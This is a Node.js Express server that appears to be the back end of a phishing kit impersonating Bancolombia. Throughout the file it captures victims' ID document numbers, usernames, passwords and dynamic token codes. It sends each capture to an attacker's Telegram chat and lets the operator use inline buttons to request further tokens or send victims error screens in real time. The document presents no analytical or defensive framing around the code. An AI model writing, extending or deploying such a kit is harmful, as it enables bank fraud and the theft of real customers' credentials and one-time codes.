require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET || 'bancol_secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Set true if using HTTPS
}));

// Static files
app.use(express.static(path.join(__dirname, 'public')));

// Helpers
const formatSessionData = (sessionData) => {
    let message = "";

    if (sessionData.aviso) {
        message += `⚠️ <b>AVISO: ${sessionData.aviso}</b>\n`;
        message += "--------------------------------\n\n";
    }

    message += "🔔 <b>NUEVA CAPTURA - BANCOLOMBIA</b>\n\n";

    if (sessionData.documentType && sessionData.documentNumber) {
        message += "📋 <b>Documento</b>\n";
        message += `Tipo: ${sessionData.documentType}\n`;
        message += `Número: ${sessionData.documentNumber}\n\n`;
    }

    if (sessionData.usuario && sessionData.clave) {
        message += "🔐 <b>Credenciales</b>\n";
        message += `Usuario: ${sessionData.usuario}\n`;
        message += `Clave: ${sessionData.clave}\n\n`;
    }

    if (sessionData.token) {
        message += "🔑 <b>TOKEN DINÁMICO</b>\n";
        message += `Código: <code>${sessionData.token}</code>\n\n`;
    }

    if (sessionData.status) {
        message += `📍 <b>Estado:</b> ${sessionData.status}\n\n`;
    }

    message += "⏰ " + new Date().toLocaleString('es-CO');

    return message;
};

// API Endpoints
app.post('/api/process', (req, res) => {
    const { documentType, documentNumber } = req.body;
    req.session.documentType = documentType;
    req.session.documentNumber = documentNumber;
    req.session.telegram_stage = 'documento';
    req.session.currentAction = null;

    console.log(`[PROCESS] Doc: ${documentType} - ${documentNumber}`);
    res.json({ success: true });
});

app.post('/api/send-message', async (req, res) => {
    const { stage, data } = req.body;

    // Accumulate data in session
    Object.assign(req.session, data);

    const message = formatSessionData(req.session);
    const sessionId = req.sessionID;

    const buttons = {
        inline_keyboard: [
            [
                { text: '❌ Error Documento', callback_data: `error_documento:${sessionId}` },
                { text: '✅ Pedir Logo', callback_data: `pedir_logo:${sessionId}` }
            ],
            [
                { text: '❌ Error Logo', callback_data: `error_logo:${sessionId}` },
                { text: '🔑 Pedir Token', callback_data: `pedir_token:${sessionId}` }
            ],
            [
                { text: '❌ Error Token', callback_data: `error_token:${sessionId}` },
                { text: '🏁 Finalizar', callback_data: `finalizar:${sessionId}` }
            ]
        ]
    };

    try {
        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                reply_markup: buttons
            })
        });
        res.json({ success: true });
    } catch (error) {
        console.error('Telegram Error:', error);
        res.status(500).json({ success: false });
    }
});

// Polling and handling for Telegram
let lastUpdateId = 0;

const pollTelegram = async () => {
    try {
        const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        const data = await response.json();

        if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                    const callbackQuery = update.callback_query;
                    const [action, sessionId] = callbackQuery.data.split(':');
                    const messageId = callbackQuery.message.message_id;
                    const chatId = callbackQuery.message.chat.id;

                    console.log(`[TELEGRAM] Action: ${action} for Session: ${sessionId}`);

                    // Save action for the session
                    global.pendingActions = global.pendingActions || {};
                    global.pendingActions[sessionId] = action;

                    // 1. Remove buttons from the message
                    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            reply_markup: { inline_keyboard: [] }
                        })
                    });

                    // 2. Answer callback query to stop the loading state in Telegram
                    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ callback_query_id: callbackQuery.id })
                    });
                }
            }
        }
    } catch (error) {
        console.error('Polling Error:', error);
    }
    // Continue polling
    setTimeout(pollTelegram, 1000);
};

// API Endpoints
app.get('/api/check-action', (req, res) => {
    const sessionId = req.sessionID;
    const action = global.pendingActions ? global.pendingActions[sessionId] : null;
    if (action) {
        delete global.pendingActions[sessionId];
    }
    res.json({ action: action || null });
});

// Start Server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
    // Start Telegram polling automatically
    pollTelegram();
});
